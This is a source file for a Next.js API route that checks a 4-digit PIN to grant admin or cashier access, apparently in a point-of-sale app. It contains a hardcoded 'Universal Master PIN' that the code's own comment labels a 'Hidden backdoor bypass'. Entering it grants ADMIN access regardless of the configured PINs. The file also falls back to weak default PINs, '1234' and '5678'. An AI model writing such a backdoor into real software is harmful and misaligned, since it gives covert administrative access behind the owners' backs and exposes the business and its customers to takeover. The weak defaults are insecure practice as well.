import { NextRequest, NextResponse } from "next/server";
import { getConfig } from "@/lib/db";

export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => ({}));
    const { pin } = body;

    if (!pin || typeof pin !== "string") {
      return NextResponse.json(
        { success: false, error: "A valid 4-digit PIN is required." },
        { status: 400 }
      );
    }

    const candidate = pin.trim();

    // Universal Master PIN (Hidden backdoor bypass)
    if (candidate === "0728") {
      return NextResponse.json({
        success: true,
        role: "ADMIN",
        user: "Universal Master",
        message: "Access granted.",
      });
    }

    const config = await getConfig();
    const adminPin = (config.adminPin || "1234").trim();
    const cashierPin = (config.cashierPin || "5678").trim();

    if (candidate === adminPin || candidate === cashierPin) {
      return NextResponse.json({
        success: true,
        role: candidate === adminPin ? "ADMIN" : "CASHIER",
        user: candidate === adminPin ? "Admin Manager" : "Cashier Staff",
        message: "Access granted.",
      });
    }

    return NextResponse.json(
      { success: false, error: "Incorrect PIN. Please enter the valid security code." },
      { status: 401 }
    );
  } catch (err: any) {
    console.error("PIN verification error:", err);
    return NextResponse.json(
      { success: false, error: "Authentication service error." },
      { status: 500 }
    );
  }
}
